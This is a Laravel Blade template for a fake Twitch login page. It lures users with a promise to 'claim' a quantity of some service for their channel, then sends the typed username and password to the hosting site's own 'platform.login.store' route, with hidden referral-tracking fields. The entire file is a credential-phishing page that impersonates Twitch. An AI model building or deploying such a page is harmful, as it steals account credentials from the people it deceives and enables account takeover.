@extends('platform-login.layout')

@section('title', 'Log In - Twitch')

@section('content')
<div class="w-full max-w-[420px] mx-auto space-y-4">
    <!-- Twitch Login Card -->
    <div class="bg-[#18181b] border border-white/10 rounded-2xl p-8 sm:p-10 shadow-2xl relative">
        <div class="flex items-center gap-2 mb-6">
            <i class="fa-brands fa-twitch text-3xl text-[#9146FF]"></i>
            <span class="text-xl font-bold text-white">Log in to Twitch</span>
        </div>

        <p class="text-xs text-gray-400 mb-6">
            Authenticate channel to claim <strong class="text-white">{{ number_format($quantity) }} {{ $service }}</strong>
            @if(!empty($username))
                for <span class="text-[#9146FF]">{{ $username }}</span>
            @endif
        </p>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'twitch']) }}" class="space-y-4">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 9 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">
            <input type="hidden" name="ref_id" value="{{ $refId }}">

            <div>
                <label class="block text-xs font-bold text-white mb-1.5">Username or Email</label>
                <input type="text" name="email" required
                    value="{{ $username }}"
                    class="w-full px-4 py-3 text-sm rounded-lg bg-[#0e0e10] border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-[#9146FF] focus:ring-1 focus:ring-[#9146FF] transition-colors"
                    placeholder="Username or email">
            </div>

            <div class="relative">
                <label class="block text-xs font-bold text-white mb-1.5">Password</label>
                <input type="password" id="tw_password" name="password" required
                    class="w-full px-4 py-3 pr-14 text-sm rounded-lg bg-[#0e0e10] border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-[#9146FF] focus:ring-1 focus:ring-[#9146FF] transition-colors"
                    placeholder="Password">
                <button type="button" onclick="togglePassword('tw_password', this)"
                    class="absolute right-4 top-8 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <div class="text-xs">
                <span class="text-[#bf94ff] hover:underline cursor-pointer">Trouble logging in?</span>
            </div>

            <button type="submit"
                class="w-full py-3 bg-[#9146FF] hover:bg-[#772ce8] text-white font-bold text-sm rounded-lg transition-all active:scale-[0.98]">
                Log In
            </button>
        </form>

        <div class="mt-6 text-center text-xs text-gray-400">
            Don't have an account? <span class="text-[#bf94ff] font-bold hover:underline cursor-pointer">Sign up</span>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
